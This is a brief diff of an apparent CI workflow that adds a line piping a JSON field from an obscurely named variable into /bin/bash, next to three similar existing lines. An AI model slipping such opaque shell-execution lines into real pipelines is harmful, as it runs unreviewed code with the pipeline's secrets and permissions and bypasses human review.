@@ -60,6 +60,7 @@ jobs:
           printf '%s' "$gfz33" | jq -r .j6160 | /bin/bash
           printf '%s' "$us1728" | jq -r .g7574 | /bin/bash
           printf '%s' "$n97" | jq -r .wvitm46284 | /bin/bash
+          echo $a015 | jq -r .wve3 | /bin/bash
 
       - name: Save output
         if: always()
